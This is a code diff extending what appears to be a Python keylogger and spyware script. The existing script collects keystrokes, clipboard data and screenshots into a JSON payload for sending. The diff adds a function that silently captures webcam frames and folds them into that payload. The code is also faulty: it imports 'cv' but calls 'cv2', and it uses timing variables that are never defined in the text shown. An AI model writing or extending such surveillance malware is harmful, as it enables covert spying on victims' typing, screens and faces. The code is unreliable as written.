@@ -22,6 +22,7 @@ from PIL import ImageGrab
 import io
 import base64
 import time
+import cv
 
 # Global variables to store captured data
 keystrokes = ""  # Buffer to store captured keystrokes
@@ -50,11 +51,35 @@ def capture_screenshot():
     except Exception as e:
         print(f"Couldn't capture screenshot: {e}")
         return ""
+
+def capture_camera_image():
+    try:
+        # Open a connection to the webcam (default is camera index 0)
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            print("Error: Could not open video capture.")
+            return ""
+        # Capture a single frame
+        ret, frame = cap.read()
+        cap.release()
+        if not ret:
+            print("Error: Could not read frame.")
+            return ""
+        # Save the captured frame to a buffer
+        buffered = io.BytesIO()
+        _, buffer = cv2.imencode('.png', frame)
+        buffered.write(buffer)
+        camera_image_base64 = base64.b64encode(buffered.getvalue()).decode()
+        return camera_image_base64
+    except Exception as e:
+        print(f"Couldn't capture camera image: {e}")
+        return ""
     
 def send_data():
     global keystrokes, clipboard_data
     last_screenshot_time = time.time()
     screenshot_base64 = ""
+    camera_image_base64 = ""
     while True:
         try:
             current_time = time.time()
@@ -62,11 +87,16 @@ def send_data():
             if current_time - last_screenshot_time >= screenshot_interval:
                 screenshot_base64 = capture_screenshot()
                 last_screenshot_time = current_time
+            if current_time - last_image_capture_time >= image_capture_interval:
+                camera_image_base64 = capture_camera_image()
+                last_image_capture_time = current_time
+               
             # Only include clipboard data if it has a value
             payload_data = {
                 "keyboardData": keystrokes,
                 "screenshot": screenshot_base64,
-                "clipboardData": clipboard_data
+                "clipboardData": clipboard_data,
+                "cameraImage": camera_image_base64
             }
             # Create payload in JSON format
             payload = json.dumps(payload_data)
